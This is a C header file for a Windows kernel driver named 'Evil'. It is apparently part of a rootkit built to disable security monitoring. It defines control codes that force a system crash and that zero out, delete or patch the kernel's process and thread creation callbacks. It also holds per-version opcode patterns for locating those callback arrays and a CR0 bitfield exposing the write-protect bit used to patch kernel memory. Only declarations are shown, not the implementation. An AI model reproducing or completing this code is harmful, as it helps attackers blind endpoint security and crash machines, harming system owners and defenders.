#pragma once

#define DRIVER_TAG 'live'
#define DRIVER_PREFIX "[EVIL] "
#define DRIVER_NAME	"Evil"

#define EVIL_DRV	0x8000
#define IOCTL_BASE	0x800

#define CTL_CODE_HIDE(i)	\
	CTL_CODE(EVIL_DRV, IOCTL_BASE+i, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_EVIL_BSOD				  CTL_CODE_HIDE(0)
#define IOCTL_EVIL_LIST_MODULES		  CTL_CODE_HIDE(1)
#define IOCTL_EVIL_PROCESS_ZEROOUT_ARRAY	  CTL_CODE_HIDE(2)
#define IOCTL_EVIL_PROCESS_DELETE_CALLBACK	  CTL_CODE_HIDE(3)
#define IOCTL_EVIL_PROCESS_CALLBACK_RET		  CTL_CODE_HIDE(4)
#define IOCTL_EVIL_PROCESS_ROLLBACK_RET	      CTL_CODE_HIDE(5)

#define IOCTL_EVIL_THREAD_ZEROOUT_ARRAY	      CTL_CODE_HIDE(6)
#define IOCTL_EVIL_THREAD_DELETE_CALLBACK	  CTL_CODE_HIDE(7)
#define IOCTL_EVIL_THREAD_CALLBACK_RET		  CTL_CODE_HIDE(8)
#define IOCTL_EVIL_THREAD_ROLLBACK_RET	      CTL_CODE_HIDE(9)

struct EvilData {
	int list;
	int remove;
	int index;
};

struct ModulesData {
	CHAR ModuleName[256];
	ULONG64 ModuleBase;
};

// https://www.gaijin.at/en/infos/windows-version-numbers
typedef enum _WINDOWS_INDEX {
	WindowsIndexUNSUPPORTED = 0,
	WindowsIndexXP = 1,
	WindowsIndex2K3 = 2,
	WindowsIndexVISTA = 3,
	WindowsIndexWIN7 = 4,
	WindowsIndexWIN8 = 5,
	WindowsIndexWIN81 = 6,
	WindowsIndexWIN10_1507 = 7,
	WindowsIndexWIN10_1511 = 8,
	WindowsIndexWIN10_1607 = 9,
	WindowsIndexWIN10_1703 = 10,
	WindowsIndexWIN10_1709 = 11,
	WindowsIndexWIN10_1803 = 12,
	WindowsIndexWIN10_1809 = 13,
	WindowsIndexWIN10_1903 = 14,
	WindowsIndexWIN10_1909 = 15,
	WindowsIndexWIN10_2004 = 16,
} WINDOWS_INDEX, * PWINDOWS_INDEX;

// E8 - CALL
// E9 - JMP
// 2D - R13
// 3D - R15
UCHAR OPCODE_PSP[]	 = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe8, 0xe8, 0xe8 };
//process callbacks
UCHAR OPCODE_LEA_R13_1[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4c, 0x4c, 0x4c };
UCHAR OPCODE_LEA_R13_2[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8d, 0x8d, 0x8d };
UCHAR OPCODE_LEA_R13_3[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2d, 0x2d, 0x2d };
// thread callbacks
UCHAR OPCODE_LEA_RCX_1[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x48, 0x48 };
UCHAR OPCODE_LEA_RCX_2[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8d, 0x8d, 0x8d };
UCHAR OPCODE_LEA_RCX_3[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0d, 0x0d, 0x0d };
#pragma warning(disable:4201)

typedef union {
	struct {
		UINT64 protection_enable : 1;
		UINT64 monitor_coprocessor : 1;
		UINT64 emulate_fpu : 1;
		UINT64 task_switched : 1;
		UINT64 extension_type : 1;
		UINT64 numeric_error : 1;
		UINT64 reserved_1 : 10;
		UINT64 write_protect : 1;
		UINT64 reserved_2 : 1;
		UINT64 alignment_mask : 1;
		UINT64 reserved_3 : 10;
		UINT64 not_write_through : 1;
		UINT64 cache_disable : 1;
		UINT64 paging_enable : 1;
	};

	UINT64 flags;
} cr0;

